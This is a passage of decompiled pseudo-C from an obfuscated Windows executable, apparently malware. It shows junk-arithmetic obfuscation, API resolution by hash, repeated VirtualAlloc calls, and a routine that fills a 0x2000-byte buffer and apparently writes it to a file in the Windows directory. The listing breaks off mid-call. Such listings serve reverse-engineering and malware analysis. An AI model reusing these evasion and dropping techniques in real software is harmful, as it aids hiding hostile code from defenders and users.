  int v168; // [esp-5Ch] [ebp-60h]
  int v169; // [esp-58h] [ebp-5Ch]
  int v170; // [esp-54h] [ebp-58h]
  int v171; // [esp-50h] [ebp-54h]
  int v172; // [esp-4Ch] [ebp-50h]
  int v173; // [esp-48h] [ebp-4Ch]
  int v174; // [esp-3Ch] [ebp-40h]
  int v175; // [esp-34h] [ebp-38h]
  char *v176; // [esp-2Ch] [ebp-30h]
  int v177; // [esp-28h] [ebp-2Ch]
  int v178; // [esp-20h] [ebp-24h]
  int v179; // [esp-1Ch] [ebp-20h]
  int v180; // [esp-18h] [ebp-1Ch]
  int v181; // [esp-10h] [ebp-14h]
  int v182; // [esp+0h] [ebp-4h] OVERLAPPED BYREF
  unsigned int retaddr; // [esp+4h] [ebp+0h] OVERLAPPED

  v12 = *(_DWORD *)((_BYTE *)&v147 + 1) & a1;
  v13 = (unsigned int)&v182 - 1755;
  if ( !v12 )
    v13 &= v165;
  v149 |= v13;
  *(_DWORD *)v156 &= v12;
  v60 = v12 | 0x122A;
  if ( v60 == v136 )
    goto LABEL_29;
  v61 = v13 + (v60 & 0x23E3);
  v31 = (unsigned int)v91;
  v32 = *(_DWORD *)&v93[2] + (v115 ^ v13) - *(_DWORD *)v93;
  if ( v32 == v61 )
  {
LABEL_94:
    LOWORD(v135) = v135 ^ 0xDA;
    LODWORD(v96) = v96 - v61;
    v13 = (unsigned int)&v182;
    v60 = ((*(_DWORD *)((_BYTE *)&a2 + 3) & (retaddr | v61 | (unsigned int)v91)) - a2) & (DWORD2(a2) | v61);
LABEL_29:
    v31 = (unsigned int)v105;
    v32 = v13 - v60;
    v123 += 71;
LABEL_88:
    v158 += v31;
    v32 ^= v106;
    v61 = (unsigned int)&v129;
    v31 = v32 & (unsigned int)&v105[-*(_DWORD *)&v130[2]];
    goto LABEL_86;
  }
  *(_DWORD *)v116 = v116[0] & 0xC8;
  v157 += 222;
  v85 ^= v61;
  if ( v170 != v32 )
    goto LABEL_88;
  if ( v32 == 686 )
  {
LABEL_86:
    v73 = v31 + (v147 & v32);
    goto LABEL_62;
  }
  v167 &= 0xDFu;
  *(_DWORD *)v156 &= (unsigned int)v91;
  v73 = v32 - v179;
  v61 = (unsigned int)&v114;
  if ( &v182 != (int *)560 )
  {
    v122[4] -= 26;
    v136 |= 0xDFu;
    LOBYTE(v107) = v107 & 0x5A;
    v61 = (unsigned int)&v114 | 0x247F;
    goto LABEL_94;
  }
LABEL_62:
  v112 &= 0xC1u;
  v57 = v158 | (*(_DWORD *)&v156[3] + ((__PAIR64__(v31, v61) - __PAIR64__(v73, 11892)) >> 32));
  v58 = *(_DWORD *)v159 | *(_DWORD *)&v156[2] | v73 | 0x3179;
  v55 = __CFADD__(v57, 10886);
  v65 = v57 + 10886;
  v66 = v58 - (v55 + v65);
  v67 = (v171 ^ v65) + 745;
  v68 = v147 ^ (unsigned int)&v156[4];
  v35 = (v147 ^ (unsigned int)&v156[4]) + v66;
  if ( v67 != v35 )
    goto LABEL_40;
  *(_DWORD *)&v92[2] &= v68;
  v24 = v68 - v35;
  v69 = v67 - v35;
  if ( v24 == 850 )
    goto LABEL_26;
  LOWORD(v127) = v127 & 0xC6;
  v25 = (int)&v101 + 2;
  v52 = v102 + DWORD1(v101) + v69;
  if ( (_TBYTE *)((char *)&v101 + 2) == v89 )
  {
LABEL_75:
    *(_DWORD *)v122 = v122[0] & 0xED;
    v24 = (int)&v80;
    v69 = (unsigned int)&v182 + *(_DWORD *)((char *)&v80 + 1) - v81;
LABEL_26:
    v119 ^= 4u;
    v29 = v161 & v69;
    goto LABEL_36;
  }
  *(_DWORD *)v130 ^= 0x49u;
  v53 = v52 | ((unsigned int)&v101 + ((_TBYTE *)((char *)&v101 + 2) < v89) + v24 + 2);
  v104 |= 0xC7u;
  v44 = v53 + v52;
  if ( v53 == v151.LowPart )
    goto LABEL_11;
  v134 += v44;
  v169 ^= v44;
  LOWORD(v129) = v129 ^ 0xFA;
  v107 -= v53;
  v24 = *(_DWORD *)&v92[2] | v126 & *(_DWORD *)((_BYTE *)&v101 + 6) & v53;
  if ( v44 == v127 )
    goto LABEL_27;
  v54 = v44 | 0x6B;
  v118 ^= v54;
  v171 -= 91;
  v108 &= v24;
  LOBYTE(v87) = v87 ^ 0x12;
  v25 = (((unsigned int)&v101 + 2) & 0xCDC) + 3292;
  v40 = v54 & 0x335E;
  if ( !v24 )
    goto LABEL_30;
  v75 = (v139 ^ v40 & 0x2634) + v25;
  v29 = v75 + (((v139 ^ v40 & 0x2634) + __PAIR64__(v139 ^ v40 & 0x2634, v25)) >> 32);
  if ( v75 == v151.HighPart )
  {
    v103 &= 0x15u;
    if ( &v182 == (int *)708 )
      v175 ^= 0x33u;
    v175 |= 0x55u;
    v168 += (int)&v182;
    v108 &= (unsigned int)&v182;
    goto LABEL_75;
  }
LABEL_36:
  v24 = *(_DWORD *)((_BYTE *)&a2 + 7) & (v24 ^ 0xEF0);
  v25 = (int)&v182 - v29;
LABEL_27:
  v24 |= v120;
  v110 += 192;
  v40 = v81 & ((unsigned int)&v117 | 0x12C0);
LABEL_30:
  v33 = v25 ^ 0x3384;
  v34 = v33 & v24;
  LOWORD(v100) = v100 | 0xC4;
  v35 = v33 - 7856;
  v132 ^= v34;
  v172 &= v40;
LABEL_40:
  v88 &= 0x81u;
  v25 = v166 | v35;
  v44 = ((unsigned int)&v121[1] + v109) ^ 0x3D0E;
LABEL_11:
  v133 += 14;
  v11 = v25 - 8563;
  WORD2(v80) -= 185;
  v8 = v11 + (v44 | 0x804);
  v9 = v11 | (unsigned int)&v164;
  LOBYTE(v170) = v170 | 0xB0;
  *(_DWORD *)v116 &= v11;
  v10 = v11 + 2443;
  if ( v9 - v8 == 0xAFD )
  {
    v159[2] ^= 0xA9u;
    v169 ^= v10;
  }
  v2 = QueryPerformanceCounter(&v151);
  if ( v3 == v148 )
  {
    v108 |= 0x99u;
    v79 = (int *)(v182 & *(unsigned int *)((char *)&retaddr + 2) & v2);
    if ( &v182 == (int *)273 )
    {
      v72 = -195;
      if ( 273 - MEMORY[0xD] != MEMORY[0xE1] )
        goto LABEL_63;
      v79 = &v182;
      LODWORD(v147) = v147 - 9;
      v124 |= 0xB8u;
    }
    v83 |= 0x78u;
    v2 = (unsigned int)v79 + v144;
  }
  v72 = v87 & v2;
LABEL_63:
  v59 = (unsigned int)&v182 | 0x219A;
  LOWORD(v146) = v146 + 188;
  LOWORD(v136) = v136 ^ 0xD0;
  v6 = v72 ^ 0x23D0;
  v144 ^= 0x7Au;
  if ( v59 == v6 )
    goto LABEL_5;
  v7 = v6 - 14;
  v86 -= 92;
  v181 &= 0xE6u;
  v21 = v59 - v7;
  if ( v7 )
    goto LABEL_52;
  v22 = *(_DWORD *)((_BYTE *)&a2 + 6) & *(_DWORD *)((_BYTE *)&a2 + 2) & v21;
  v163 &= v22;
  v23 = (*(int *)((char *)&v182 + 1) ^ 0x31B)
      + (*(int *)((char *)&v182 + 1) & (unsigned int)&v182)
      - *(_DWORD *)&v137[2];
  if ( v23 == 539 )
    goto LABEL_6;
  v27 = v22 - a2;
  v48 = (*(unsigned int *)((char *)&retaddr + 3) | v23) - a2 - (_DWORD)&v182;
  LOWORD(v89) = (unsigned __int8)v89 & 0x76;
  LOBYTE(v133) = v133 & 0xD6;
  v153 &= 0xBu;
  if ( v48 != v128 )
    goto LABEL_6;
  v4 = v48 | (unsigned int)&v182;
  v135 &= 0xECu;
  v5 = v48 - v27;
  v143 -= v27;
  LOBYTE(v133) = v133 - 31;
  if ( v5 == v27 )
  {
    v50 = v5 + 2852;
    v51 = v27 & 0xB24;
    v164 -= 161;
    if ( v50 != 694 )
      goto LABEL_5;
    LOWORD(v129) = v129 - 45;
    HIWORD(v120) ^= 0xCCu;
    v153 += v51;
    if ( v51 != v4 )
      v151.LowPart -= v4;
LABEL_6:
    v141 -= 24;
LABEL_5:
    v113 &= 0xE6u;
    HIDWORD(v80) = BYTE4(v80) & 0x80;
    v152 += 252;
LABEL_52:
    v177 += 238;
    v138 += 238;
  }
  v174 |= 0x42u;
  v82 &= 0x96u;
  v41 = QueryPerformanceCounter(&v154);
  v77 = v42 ^ 0x2814;
  v43 = v41 - 1489;
  if ( *(_DWORD *)&v92[2] != v77 )
  {
    v162 ^= 0xACu;
    v43 ^= v115;
    v160 -= 34;
  }
  v70 = v43 - 12407;
  v121[0] ^= v70;
  if ( v70 != v129 )
  {
    v122[8] -= 10;
    *(_DWORD *)&v122[8] |= v70;
    v19 = (unsigned int)&v182;
    v36 = DWORD2(a2) + *(int *)((char *)&v182 + 3) + v76;
    v37 = v182 + v70;
    v15 = v124 | v37;
    if ( (int *)v151.HighPart != &v182 )
    {
      v16 = (char *)&v182;
      v17 = DWORD1(a2) & (unsigned int)&v182;
      v18 = *(_DWORD *)((char *)&a2 + 5) | *(_DWORD *)((char *)&a2 + 5) | v36;
      v180 &= 0x99u;
      v111 &= v18;
      v154.HighPart ^= DWORD1(a2) & (unsigned int)&v182;
      v118 += 144;
      if ( &v182 == (int *)v17 )
      {
        v14 = *(_DWORD *)&v159[2] ^ v17;
        if ( v18 )
          goto LABEL_28;
        v56 = v14 - *(_DWORD *)((char *)&a2 + 1);
        v49 = &v99;
        v19 = LODWORD(v101) ^ v56;
        v20 = (int)&v182 + *(_DWORD *)((char *)&v101 + 2) - v100;
        if ( v19 )
        {
LABEL_71:
          v62 = (unsigned int)v49 + v19;
          v63 = v20 ^ 0x3C78;
          v64 = (unsigned int)v49 + v63;
          v71 = v64 | v62;
          LOBYTE(v111) = v111 & 0x13;
          v131 |= v71;
          v18 = (v64 + 6381) | (v64 + v63);
          v14 = v146 & v71;
          v174 |= 0x93u;
LABEL_28:
          v30 = v155 | v14;
          v84 += 254;
          v126 &= v30;
          v76 = *(_DWORD *)&v94[2] + (*(int *)((char *)&v182 + 3) | (v18 - *(int *)((char *)&v182 + 3)));
          v77 = *(_DWORD *)v94 + v30;
          goto LABEL_84;
        }
        v18 = (int)&v182;
        v17 = (unsigned int)&v182;
        v97 &= (unsigned int)&v106 + 1;
        v16 = (char *)&v182 - 6058;
      }
      v178 += v18;
      v19 = (unsigned int)&v90 & *(_DWORD *)&v92[2] & (*(_DWORD *)v92 | v17);
      v36 = (int)&v90 - v97;
      v15 = (__int16)&v90 + (_DWORD)v16 - v80;
    }
    v49 = (int *)(v15 & 0x2DEA);
    v20 = (v19 & v36) - 10271;
    goto LABEL_71;
  }
LABEL_84:
  WORD2(v80) ^= 7u;
  v145 &= 0xA8u;
  v39 = v76 - v124;
  v28 = (unsigned int)&v182;
  v38 = (a2 & v77) - v39;
  LOWORD(v146) = v146 & 0x57;
  if ( v38 )
  {
    v28 = (unsigned int)&v182;
    v39 = (__PAIR64__(((unsigned int)&v182 & v39) - DWORD1(a2), (unsigned int)&v182 & v39)
         - __PAIR64__(&v182, DWORD1(a2))) >> 32;
  }
  if ( (char *)v39 == v176 )
  {
    LOBYTE(v133) = v133 - 58;
    v38 = (int)&v182;
    v39 = (unsigned int)v95 + *(unsigned int *)((char *)&retaddr + 3);
    v28 = v142 & *(_DWORD *)((_BYTE *)&a2 + 6) & DWORD2(a2) & (unsigned int)&v182;
  }
  if ( v181 == v38 )
    goto LABEL_102;
  v26 = v28 + v39 + __CFADD__(v28, v39) + v28 + v39;
  v95[0] -= 141;
  if ( !v28 )
    goto LABEL_15;
  v134 += v26;
  v45 = *(_DWORD *)&v116[2] & v26;
  v28 = v45 + 2 * (_DWORD)&v115;
  v46 = v38 | v45;
  if ( v28 )
  {
    v150 += 232;
    v47 = v46 | (v46 + (v138 ^ v38));
    v98 ^= 0x48u;
    if ( v28 == 371 )
      goto LABEL_37;
    if ( (_BYTE *)v28 != v140 )
      goto LABEL_51;
    ++v179;
    v90 += 207;
    v55 = __CFADD__(v125, 138);
    v125 += 138;
    v78 = (unsigned int)&v140[-v55 - v28];
    v176 = (char *)((unsigned __int8)v176 & 0xD2);
    if ( HIDWORD(v147) != v78 )
      goto LABEL_97;
    BYTE4(v151.QuadPart) &= 0xC0u;
  }
  v28 = ((unsigned int)&v182 - (*(int *)((char *)&v182 + 3) ^ a2 ^ (unsigned int)&v83) - v182) ^ 0x2D2;
  v47 = v28 & (unsigned int)&v182;
LABEL_37:
  v38 = HIDWORD(v96) & (v169 + v47);
LABEL_102:
  v47 = *(_DWORD *)&v122[1] ^ (*(_DWORD *)&v122[6] | *(_DWORD *)&v122[4] & v38);
  v153 ^= v47;
  v171 |= 0x5Bu;
  v78 = (unsigned int)v121 + v28;
LABEL_97:
  v26 = (v47 | v78) - v173;
LABEL_15:
  v28 = *(_DWORD *)((_BYTE *)&a2 + 7) & ((unsigned int)&v182 + v26);
LABEL_51:
  result = *(_DWORD *)((char *)&v96 + 2) ^ (*(_DWORD *)v137 | v28);
  LOWORD(v150) = v150 + 183;
  return result;
}
// 405418: variables would overlap: ^334.4 and ^335.4,^337.4
// 405418: variables would overlap: ^338.4(retaddr) and ^33A.4,^33B.4

//----- (00405A1A) --------------------------------------------------------
int sub_405A1A()
{
  int v0; // eax
  DWORD v2; // [esp+1Ch] [ebp-2C8h]
  int v3; // [esp+30h] [ebp-2B4h]
  DWORD flProtect; // [esp+ACh] [ebp-238h]
  int v5; // [esp+C4h] [ebp-220h]
  int v6; // [esp+E4h] [ebp-200h]
  DWORD v7; // [esp+100h] [ebp-1E4h]
  DWORD flAllocationType; // [esp+104h] [ebp-1E0h]
  int v9; // [esp+114h] [ebp-1D0h]
  DWORD v10; // [esp+11Ch] [ebp-1C8h]
  DWORD v11; // [esp+1B0h] [ebp-134h]
  DWORD v12; // [esp+1C0h] [ebp-124h]
  DWORD v13; // [esp+1C8h] [ebp-11Ch]
  DWORD v14; // [esp+1E4h] [ebp-100h]
  DWORD v15; // [esp+228h] [ebp-BCh]
  int v16; // [esp+26Ch] [ebp-78h]
  DWORD v17; // [esp+2A4h] [ebp-40h]
  DWORD v18; // [esp+2B4h] [ebp-30h]

  GetOEMCP();
  VirtualAlloc(0, 0xE00u, v13, v7);
  GetOEMCP();
  VirtualAlloc(0, 0x600u, v17, v18);
  GetOEMCP();
  GetACP();
  VirtualAlloc(0, 0x600u, v15, v14);
  GetACP();
  VirtualAlloc(0, 0x400u, v12, v11);
  VirtualAlloc(0, 0x500u, flAllocationType, flProtect);
  GetOEMCP();
  GetCurrentThreadId();
  VirtualAlloc(0, 0x1000u, v2, v10);
  GetCurrentThreadId();
  v0 = v3 + ((unsigned int)(v9 + v16 + 1) < 0xE6C) + GetOEMCP();
  if ( v9 + v16 == 3691 )
    v0 = v6 + 988;
  return v0 - v5;
}
// 402D26: variable 'v13' is possibly undefined
// 402D26: variable 'v7' is possibly undefined
// 402D42: variable 'v17' is possibly undefined
// 402D42: variable 'v18' is possibly undefined
// 4050F3: variable 'v15' is possibly undefined
// 4050F3: variable 'v14' is possibly undefined
// 403672: variable 'v12' is possibly undefined
// 403672: variable 'v11' is possibly undefined
// 401B01: variable 'flAllocationType' is possibly undefined
// 401B01: variable 'flProtect' is possibly undefined
// 401B35: variable 'v2' is possibly undefined
// 401B35: variable 'v10' is possibly undefined
// 401B63: variable 'v3' is possibly undefined
// 401B56: variable 'v9' is possibly undefined
// 401B56: variable 'v16' is possibly undefined
// 40563D: variable 'v6' is possibly undefined
// 4021C5: variable 'v5' is possibly undefined

//----- (00405ECA) --------------------------------------------------------
int __usercall sub_405ECA@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 205 < 7 )
    result = 182;
  else
    result = 37;
  return result;
}
// 405ED6: conditional instruction was optimized away because of '%0x34.4==43'

//----- (00405F1A) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_405F1A@<eax>(int a1@<eax>, int a2@<ebp>)
{
  int v2; // eax

  *(_DWORD *)(a2 - 20) = 224;
  *(_DWORD *)(a2 - 44) = 66;
  *(_DWORD *)(a2 - 4) = 63;
  *(_DWORD *)(a2 - 24) = 16;
  *(_DWORD *)(a2 - 36) = 152;
  *(_DWORD *)(a2 - 12) = 33;
  *(_DWORD *)(a2 - 8) = 66;
  *(_DWORD *)(a2 - 32) = 170;
  *(_DWORD *)(a2 - 52) = 33;
  *(_DWORD *)(a2 - 40) = 63;
  *(_DWORD *)(a2 - 16) = 190;
  *(_DWORD *)(a2 - 28) = 86;
  *(_DWORD *)(a2 - 48) = a1 % 63;
  if ( a1 % 63 >= 37 )
    return 22;
  if ( *(int *)(a2 - 12) <= 115 )
    *(_DWORD *)(a2 - 4) = *(_DWORD *)(a2 - 20);
  v2 = sub_406461(*(_DWORD *)(a2 - 40) == *(_DWORD *)(a2 - 28));
  sub_403D1D(v2);
  return 246;
}
// 402268: positive sp value 4 has been found

//----- (004062AA) --------------------------------------------------------
int __usercall sub_4062AA@<eax>(int a1@<eax>)
{
  int v2; // eax
  int v3; // et2

  v3 = a1 % 224;
  v2 = a1 / 224;
  if ( v3 >= 33 )
    return 138;
  sub_403EE4(v2);
  return 570;
}
// 4023CF: conditional instruction was optimized away because of 'edi.4==7D'

//----- (0040635B) --------------------------------------------------------
int __usercall sub_40635B@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 245 < 37 )
    result = 184;
  else
    result = 14;
  return result;
}
// 4055C8: conditional instruction was optimized away because of '%var_10.4==7A'
// 4055CE: conditional instruction was optimized away because of '%var_10.4==7A'

//----- (00406461) --------------------------------------------------------
int __usercall sub_406461@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 66 < 20 )
    result = 639;
  else
    result = 194;
  return result;
}

//----- (004065D6) --------------------------------------------------------
int __usercall sub_4065D6@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 162 < 24 )
    result = 347;
  else
    result = 28;
  return result;
}
// 401985: conditional instruction was optimized away because of '%var_18.4==5E'
// 40671A: conditional instruction was optimized away because of '%var_20.4==A2'

//----- (0040687B) --------------------------------------------------------
int sub_40687B()
{
  int v1; // [esp+0h] [ebp-4h] BYREF

  return sub_404D6C((int)&v1);
}

//----- (00406D2F) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_406D2F@<eax>(int a1@<eax>, int a2@<ebp>)
{
  int v2; // eax
  int v3; // eax
  int v4; // et2

  *(_DWORD *)(a2 - 16) = 22;
  *(_DWORD *)(a2 - 12) = 88;
  *(_DWORD *)(a2 - 8) = 203;
  *(_DWORD *)(a2 - 20) = 34;
  *(_DWORD *)(a2 - 4) = 109;
  v4 = a1 % 184;
  v3 = a1 / 184;
  if ( v4 >= 28 )
    return 184;
  *(_DWORD *)(a2 - 24) = *(_DWORD *)(a2 - 20) + 2897;
  v2 = sub_403EE4(v3);
  sub_4062AA(v2);
  return 260;
}
// 404616: positive sp value 4 has been found

//----- (004074DE) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int sub_4074DE()
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  return sub_408832(&savedregs);
}
// 4074E1: bad sp value at call

//----- (00407529) --------------------------------------------------------
char __usercall sub_407529@<al>(_DWORD *a1@<ebp>)
{
  unsigned __int8 v1; // bl
  int v2; // esi
  char result; // al
  int v4; // edx

  v1 = *(_BYTE *)(a1[4] + 256);
  *((_BYTE *)a1 - 1) = *(_BYTE *)(a1[4] + 257);
  v2 = a1[4];
  *(a1 - 2) = 0;
  *(a1 - 3) = a1[2];
  if ( *(a1 - 2) < a1[3] )
  {
    v4 = (v1 + 1) % 256;
    *((_BYTE *)a1 - 1) += *(_BYTE *)(v2 + (unsigned __int8)v4);
    sub_408EE3((_BYTE *)(v2 + (unsigned __int8)v4), (_BYTE *)(v2 + *((unsigned __int8 *)a1 - 1)));
    JUMPOUT(0x4080AC);
  }
  *(_BYTE *)(a1[4] + 256) = v1;
  result = *((_BYTE *)a1 - 1);
  *(_BYTE *)(a1[4] + 257) = result;
  return result;
}
// 4089F2: control flows out of bounds to 4080AC

//----- (00407A0F) --------------------------------------------------------
int __usercall sub_407A0F@<eax>(int a1@<eax>)
{
  int v1; // ebx
  UINT (__stdcall **v2)(LPSTR, UINT); // ebx
  int result; // eax
  int v4; // esi
  int v5; // edi
  int v6; // esi
  char v7; // di^1
  int v8; // ebx
  int v9; // esi
  int v10; // esi
  char v11; // cf
  int v12; // edx
  int v13; // edx
  int v14; // ecx
  unsigned int v15; // ecx
  bool v16; // cf
  int v17; // ecx
  int v18; // edi
  unsigned int v19; // esi
  unsigned int v20; // edi
  char v21; // cf
  int v22; // [esp-4h] [ebp-4h]
  int v23; // [esp-4h] [ebp-4h]
  unsigned int v24; // [esp-4h] [ebp-4h]
  int v25; // [esp-4h] [ebp-4h]
  int v26; // [esp-4h] [ebp-4h]
  int v27; // [esp-4h] [ebp-4h]

  v2 = &GetWindowsDirectoryA;
  result = sub_4095A7(a1, 1650, 262468866);
  v16 = v15 < dword_43E2A8;
  v17 = v22;
  v4 = v16 + 20428;
  if ( result )
  {
    LOBYTE(v2) = byte_43EEA4;
    dword_43FA32 = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
    v5 = dword_43EB6C - 1;
    dword_43E040 -= v4;
    LOBYTE(v17) = byte_43F234 + v22;
    result = sub_4095A7(result, v17, 1493072574);
    BYTE1(v2) = result;
    v6 = dword_43E654 + dword_43F084 + v4;
    v18 = v5 - dword_43F0D8;
    if ( result )
    {
      v16 = __CFADD__(v6, 24941);
      v19 = v6 + 24941;
      dword_43FC42 = (int (__stdcall *)(_DWORD, _DWORD))result;
      dword_43E034 += v23;
      v20 = v18 - 2938;
      dword_43E028 += 18590;
      dword_43E028 += (int)v2 + v16 + 13362;
      result = sub_4095A7(result, v23, 150532372);
      if ( result )
      {
        dword_43FC1E = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
        result = sub_4095A7(result, result, 1916711125);
        v13 = v12 - (v11 + 29287);
        v14 = (v19 < v20) + v26 + 28140;
        if ( result )
        {
          dword_43FB9C = (int (__fastcall *)(_DWORD, _DWORD))result;
          dword_43E044 = v13;
          LOBYTE(v14) = (v19 < v20) + v26 - 53;
          result = sub_4095A7(result, v14, -2114916129);
          if ( result )
          {
            dword_43FC12 = (int (__fastcall *)(_DWORD, _DWORD, _DWORD))result;
            v1 = dword_43EA34 - 1 + 5788;
            dword_43E048 -= v1;
            result = sub_4095A7(result, v25, 1216340331);
            v10 = v21 + 33006;
            if ( result )
            {
              dword_43FA26 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
              dword_43E030 = v1;
              v7 = BYTE1(v1) ^ 0x31;
              v8 = v1 ^ 0x31F7;
              result = sub_4095A7(result, v27, 255840707);
              v9 = result ^ v10;
              if ( result )
              {
                dword_43FBC4 = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
                BYTE1(v8) = (v24 < dword_43F9E0) + v7 + 33;
                sub_4085A0(v8 - (_DWORD)off_43F40C, v9);
                LOBYTE(dword_43E04C) = 60;
                LOBYTE(dword_43E014) = dword_43E014 + 56;
                __asm { retn }
              }
            }
          }
        }
      }
    }
  }
  return result;
}
// 408B55: variable 'v15' is possibly undefined
// 408B5B: variable 'v22' is possibly undefined
// 407265: variable 'v24' is possibly undefined
// 4093EF: variable 'v25' is possibly undefined
// 408940: variable 'v21' is possibly undefined
// 4086B9: variable 'v27' is possibly undefined
// 408B17: variable 'v12' is possibly undefined
// 408B17: variable 'v11' is possibly undefined
// 408B20: variable 'v26' is possibly undefined
// 4093A3: variable 'v23' is possibly undefined
// 43E014: using guessed type int dword_43E014;
// 43E028: using guessed type int dword_43E028;
// 43E030: using guessed type int dword_43E030;
// 43E034: using guessed type int dword_43E034;
// 43E040: using guessed type int dword_43E040;
// 43E044: using guessed type int dword_43E044;
// 43E048: using guessed type int dword_43E048;
// 43E04C: using guessed type int dword_43E04C;
// 43E2A8: using guessed type int dword_43E2A8;
// 43E654: using guessed type int dword_43E654;
// 43EA34: using guessed type int dword_43EA34;
// 43EB6C: using guessed type int dword_43EB6C;
// 43EEA4: using guessed type char byte_43EEA4;
// 43F084: using guessed type int dword_43F084;
// 43F0D8: using guessed type int dword_43F0D8;
// 43F234: using guessed type char byte_43F234;
// 43F40C: using guessed type int *off_43F40C;
// 43F9E0: using guessed type int dword_43F9E0;
// 43FA26: using guessed type int (__stdcall *dword_43FA26)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43FA32: using guessed type int (__fastcall *dword_43FA32)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43FB9C: using guessed type int (__fastcall *dword_43FB9C)(_DWORD, _DWORD);
// 43FBA4: using guessed type int dword_43FBA4;
// 43FBC4: using guessed type int (__fastcall *dword_43FBC4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43FC12: using guessed type int (__fastcall *dword_43FC12)(_DWORD, _DWORD, _DWORD);
// 43FC1E: using guessed type int (__fastcall *dword_43FC1E)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43FC3E: using guessed type int dword_43FC3E;
// 43FC42: using guessed type int (__stdcall *dword_43FC42)(_DWORD, _DWORD);

//----- (00408299) --------------------------------------------------------
unsigned int __cdecl sub_408299(_BYTE *a1)
{
  unsigned int result; // eax

  result = 0;
  while ( *a1 )
    result = (char)*a1++ ^ ((result >> 25) | (result << 7));
  return result;
}

//----- (004085A0) --------------------------------------------------------
void __usercall sub_4085A0(int a1@<ebx>, int a2@<esi>)
{
  int v2; // esi
  int v3; // ecx
  int v4; // eax
  unsigned __int8 v5; // ch
  int v6; // ecx
  char *v7; // esi
  char v8; // cl
  int v9; // ecx
  char v10; // bl
  int v11; // edx
  int v12; // edx
  int v13; // edx
  int v14; // ecx
  int v15; // ecx
  int v16; // edi
  int v17; // esi
  char v18; // bl
  int v19; // ebx
  int v20; // eax
  int v21; // edx
  int v22; // ebx
  _BYTE *v23; // esi
  int v24; // edx
  int v25; // edx
  int v26; // ecx
  _BYTE *v27; // edi
  bool v28; // cf
  int v29; // eax
  int (__thiscall *v30)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // eax
  unsigned int v31; // edx
  int v32; // eax
  int v33; // edi
  char *v34; // esi
  int v35; // eax
  _BYTE *v36; // edi
  int v37; // ebx
  int v38; // edx
  int v39; // edx
  int v40; // ecx
  _BYTE *v41; // edi
  unsigned int v42; // ebx
  int (__fastcall *v43)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // eax
  int v44; // ecx
  int v45; // edx
  int v46; // ebx
  char *v47; // esi
  int v48; // [esp-8h] [ebp-8h]
  int v49; // [esp-4h] [ebp-4h]
  int v50; // [esp-4h] [ebp-4h]

  dword_43E040 -= a1;
  v26 = 0x2000;
  dword_43E044 = a2;
  v27 = &unk_421219;
  LOBYTE(dword_43E038) = -66;
  v19 = 9675;
  do
  {
    v50 = v26;
    *v27++ = sub_4021EC(v19);
    LOWORD(v31) = 3855;
    v19 = (v19 ^ 0x155C) + 1;
    v26 = v50 - 1;
  }
  while ( v50 != 1 );
  v33 = dword_43EC28;
  v22 = (v31 < dword_43E164) + v19 + 12695;
  dword_43FC42(255, &unk_421119);
  dword_43E040 -= v33;
  LOBYTE(dword_43E044) = dword_43E044 + 117;
  dword_43E014 += (int)&GetWindowsDirectoryA;
  dword_43E02C += v44;
  dword_43E010 = v45 - 2079;
  dword_43E004 = 15851;
  LOBYTE(dword_43E02C) = 18;
  v46 = dword_43E47C + 16 * v22 + 1;
  dword_43FA32(v44 ^ 0x52F2, v45 - 2079 + 1, &unk_421119, &unk_43FC08, 0, &unk_43FA56);
  v47 = (char *)&GetWindowsDirectoryA - v28 - 7438;
  BYTE1(v46) = 8;
  dword_43E02C -= v46;
  LOBYTE(dword_43E008) = 76;
  v25 = 3219;
  LOBYTE(dword_43E014) = dword_43E014 + 21;
  dword_43E018 = (int)v47;
  LOBYTE(v25) = byte_43EC24 - 109;
  v4 = dword_43FC1E(15211, v25, &unk_43FA56, -1073741824, 1, 0, 2, 32, 0);
  LOBYTE(dword_43E028) = -38;
  dword_43E038 = 15737;
  v28 = v5 < (unsigned __int8)byte_43EB30;
  BYTE1(v6) = v5 - byte_43EB30;
  v7 = &v47[v28];
  v13 = dword_43E160;
  dword_43E014 = v6;
  LOBYTE(v13) = byte_43EE84;
  dword_43E044 -= 26017;
  LOBYTE(dword_43E04C) = -122;
  dword_43FBC4(v6 | 0x4C95, v13, v4, &unk_421219, 0x2000, &dword_43FB8C, 0, v4);
  dword_43FB9C(&GetPrivateProfileSectionA, v7 + 28352);
  v37 = 13414;
  v14 = 0x2000;
  BYTE1(v37) = byte_43E528;
  dword_43E014 = (__PAIR64__(dword_43E014, &FormatMessageA) - ((unsigned int)dword_43E2A8 | 0x479B00000000i64)) >> 32;
  v36 = &unk_421219;
  dword_43E048 += 19566;
  do
  {
    v48 = v14;
    v34 = (char *)&GetWindowsDirectoryA + dword_43EF48;
    v35 = sub_4021EC(dword_43E4B4 + v37 - (__CFADD__(dword_43E4B4, v37) + 21405));
    dword_43E020 = 552;
    *v36++ = v35;
    dword_43E024 = (int)&v34[dword_43ED94];
    v37 = v48;
    v14 = v48 - 1;
  }
  while ( v48 != 1 );
  LOBYTE(dword_43E030) = dword_43E030 - 2;
  dword_43E014 += 12470;
  v30 = (int (__thiscall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_4095A7(
                                                                      v35,
                                                                      (int)&GetWindowsDirectoryA,
                                                                      1769630462);
